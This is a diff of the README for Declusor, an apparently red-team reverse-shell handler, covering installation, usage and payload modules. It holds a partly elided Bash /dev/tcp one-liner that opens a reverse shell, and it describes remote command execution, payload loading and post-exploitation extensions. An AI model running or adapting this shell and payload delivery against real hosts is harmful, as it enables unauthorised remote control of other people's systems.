@@ -1,4 +1,4 @@
-# Declusor: A Remote Control and Payload Delivery Client
+# Declusor: Remote Control and Payload Delivery Handler
 
 [![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
 ![Python 3.x](https://img.shields.io/badge/python-3.x-blue.svg)
@@ -14,95 +14,114 @@ Its intelligent command-line interface boosts productivity with smart command an
 
 ## Features
 
-- **Shell Management**: Establish, maintain, and interact with remote shell sessions.
-- **Command Execution**: Execute arbitrary commands on the remote system with output captured by the client.
-- **Interactive Shell**: Open a full interactive shell session for seamless interaction with the remote environment.
-- **File Uploads**: Transfer files from the local machine to the remote target.
-- **Payload Loading**: Load and execute shell scripts or other payloads from local files on the remote system.
-- **Local Command Completion**: Features a custom command-line completer for easy navigation and command input, suggesting available commands and local file paths.
-
-## Technical Architecture
-
-Declusor follows a layered, dependency-inverted architecture with eight packages:
-
-| Package      | Layer          | Responsibility                                                                                |
-| ------------ | -------------- | --------------------------------------------------------------------------------------------- |
-| `interface`  | Domain         | Abstract contracts (`ICommand`, `IConnection`, `IConsole`, `IRouter`, …)                      |
-| `config`     | Domain         | Settings, enums (`ClientFile`, `OperationCode`), and exception hierarchy                      |
-| `command`    | Application    | Command objects — `ExecuteCommand`, `ExecuteFile`, `UploadFile`, `LoadPayload`, `LaunchShell` |
-| `controller` | Application    | Thin request handlers that parse input and delegate to commands                               |
-| `core`       | Infrastructure | Concrete `Console`, `Router`, `Parser`, and `PromptCLI`                                       |
-| `connection` | Infrastructure | `ShellSocketProfile` + `ShellSocketConnection` (TCP socket, ACK framing)                      |
-| `util`       | Cross-cutting  | Encoding, file I/O, network, parsing, security, and concurrency helpers                       |
-| `main`       | Entry point    | `DeclusorService` — bootstrap, wiring, and lifecycle orchestration                            |
+- **Shell Management**: Establish, maintain, and manage reverse shell sessions with connected targets.
+- **Interactive Shell**: Spawn a fully interactive shell on the remote host for real-time command execution.
+- **Command Execution**: Execute arbitrary commands on the remote system and return the output to the handler.
+- **File Upload**: Transfer files from the local machine to the remote host.
+- **Local File Execution**: Execute scripts or binaries stored on the local machine directly on the remote system.
+- **Payload Execution**: Load and execute arbitrary payloads on the remote host.
+- **Command-Line Completion**: Built-in completion for handler commands and local file paths to streamline command input and navigation.
 
 ## Getting Started
 
 ### Prerequisites
 
-- **Python 3.x**: Ensure you have Python 3 installed on your local machine.
-- **Unix‑like Operating System (Target)**: Declusor relies on some features which are standard on Linux, macOS, and other Unix‑like systems on the target machine.
+- **Python 3.x** installed on the local machine running Declusor.
+- **Unix-like target system**: The payload relies on standard utilities available on Linux, macOS, and other Unix-like systems.
 
 ### Installation
 
-Clone the Declusor repository to your local machine:
+Verify Python is available:
+
+```bash
+python3 --version
+```
+
+Clone the repository:
 
 ```bash
 git clone https://github.com/othonhugo/declusor.git
 cd declusor
-chmod 700 ./declusor
 ```
 
-No additional Python packages are required beyond the standard library.
-
-### Quick Start
+Create a virtual environment:
 
 ```bash
-# Start the listener (replace IP and PORT as needed)
-./declusor 127.0.0.1 4444
+python3 -m venv .venv
 ```
 
-The client will output a Bash one‑liner. Execute that one‑liner on the target machine to establish the reverse shell.
+Activate the environment:
+
+```bash
+# Linux / macOS
+source .venv/bin/activate
+```
+
+```powershell
+# Windows
+.venv\Scripts\Activate.ps1
+```
+
+Install the project in editable mode:
+
+```bash
+pip install -e .
+```
+
+Declusor relies only on the **Python standard library**, so no additional dependencies are required.
 
 ## Usage
 
-### Starting the Listener (Declusor Client)
+### Local Machine: Starting the Listener
 
-Run the script with the desired IP and port:
-
-```
-./declusor <LISTENER_IP> <LISTENER_PORT>
-```
-
-**Example:**
+Run Declusor with the desired listener address and port:
 
 ```bash
-./declusor 127.0.0.1 4444
+declusor <LISTENER_IP> <LISTENER_PORT>
 ```
 
-After starting the listener, Declusor prints a Bash one‑liner. This command needs to be executed on the target machine to establish the reverse shell connection back to the Declusor client.
+Example:
 
-### Establishing the Reverse Shell (Target Machine)
+```bash
+declusor 127.0.0.1 4444
+```
 
-Copy the printed one‑liner and run it on the target machine:
+After startup, Declusor prints a Bash one-liner that must be executed on the target system to initiate the reverse shell.
+
+### Remote Machine: Establishing the Reverse Shell
+
+Execute the printed one-liner on the target machine:
 
 ```bash
 ( exec 3<> /dev/tcp/127.0.0.1/4444; while [...] done <&3 >&3 2>&3 )
 ```
 
+Once executed, the target connects back to the listener and an interactive session becomes available.
+
 ### Interacting with the Target
 
-When the reverse shell is active, Declusor shows a `[declusor]` prompt.
+After a successful connection, the prompt changes to:
+
+```
+[declusor]
+```
+
+Example interaction:
 
 ```
 [declusor] help
+help    : Display detailed information about available commands or a specific command.
 load    : Load a payload file from your local system and execute it on the remote system
 command : Execute a single command on the remote system.
 shell   : Initiate an interactive shell session on the remote system.
 upload  : Upload a file from the local system to the remote system.
 execute : Execute a program or script from the local system on the remote system.
-help    : Display detailed information about available commands or a specific command.
 exit    : Terminate the session and exit the program.
+```
+
+Example payload execution:
+
+```
 [declusor] load discovery/dev_tools.sh
 
 DEVELOPMENT TOOLS
@@ -116,24 +135,35 @@ DEVELOPMENT TOOLS
 
 ## Customizing and Extending Payloads
 
-To fully leverage `declusor`, you can create custom payloads or modify the existing ones. Start by exploring the `data` directory, which contains key subdirectories: `library` and `modules`.
+Declusor can be extended by creating or modifying payloads in the `data` directory. The directory is organized into two main components.
 
-- **`data/library/`**: This folder contains scripts that are automatically sent to the target immediately after a connection is established. These scripts are intended to persist in the target's memory, effectively allowing the target to "remember" the subroutines. Once stored, these subroutines can be used repeatedly in combination with your payloads.
-- **`data/modules/`**: This folder holds scripts that the target executes on demand, organized into categories. The output from these scripts is sent back to your server (or your prompt). The `load` command automatically scans this folder for available files and directories, simplifying the process of incorporating them into your payloads.
+### `./data/library/`
+
+This directory contains scripts that are automatically transmitted to the target after a connection is established.
+
+These scripts remain loaded in memory on the target system and provide reusable subroutines that other payloads can call during the session.
+
+### `./data/modules/`
+
+This directory contains on-demand payloads executed through the `load` command.
+
+Modules are organized into categories, and their output is returned to the Declusor handler. The `load` command automatically scans this directory and lists available modules, simplifying payload discovery and execution.
 
 ## Contributing
 
-Contributions are highly encouraged and welcome! We prioritize clarity, correctness, and modularity in the codebase.
+Contributions are welcome. The project prioritizes **clarity, correctness, and modular design**.
 
-**Areas for contribution include:**
+Areas where contributions are particularly valuable:
 
-- **New Command Handlers**: Extend Declusor's functionality by adding new commands (e.g., for specific reconnaissance, privilege escalation, or post-exploitation tasks).
-- **Payload Development**: Create new scripts for the `data/library/` (persistent subroutines) or `data/modules/` (on-demand execution) directories.
-- **Cross-Platform Compatibility**: Enhance support for different operating systems, especially for the target-side one-liner or client-side execution.
-- **Documentation & Examples**: Improve existing documentation, add more detailed usage examples, or create tutorials.
-- **Bug Fixes & Robustness**: Identify and fix bugs, improve error handling, or enhance the stability of network communications.
-- **Code Refactoring & Clarity**: Improve code readability, maintainability, and adherence to best practices.
-- **Test Coverage**: Expand unit and integration tests to ensure reliability.
+- **Command Handlers**: Implement new handler commands to extend functionality (e.g., reconnaissance, privilege escalation, or post-exploitation tasks).
+- **Payload Development**: Create new scripts for `data/library/` (persistent subroutines loaded at connection time) or `data/modules/` (payloads executed on demand).
+- **Cross-Platform Support**: Improve compatibility across operating systems, particularly for the target-side one-liner and remote execution behavior.
+- **Documentation**: Improve documentation, add usage examples, or provide practical walkthroughs.
+- **Bug Fixes and Stability**: Identify and resolve bugs, improve error handling, and strengthen network communication reliability.
+- **Code Quality**: Refactor code to improve readability, modularity, and maintainability.
+- **Testing**: Expand unit and integration tests to improve reliability and prevent regressions.
+
+Pull requests that improve **usability, reliability, or extensibility** are especially appreciated.
 
 ## License
 
